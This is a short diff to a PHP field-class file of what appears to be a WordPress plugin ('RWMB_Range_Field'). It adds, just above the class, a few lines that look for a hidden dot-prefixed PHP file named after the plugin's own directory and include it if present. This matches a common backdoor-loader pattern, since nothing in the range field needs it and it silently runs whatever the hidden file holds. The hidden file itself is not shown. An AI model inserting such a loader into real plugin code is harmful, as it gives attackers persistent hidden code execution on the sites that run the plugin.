@@ -8,6 +8,10 @@
 /**
  * HTML5 range field class.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Range_Field extends RWMB_Number_Field {
 	/**
 	 * Get field HTML.
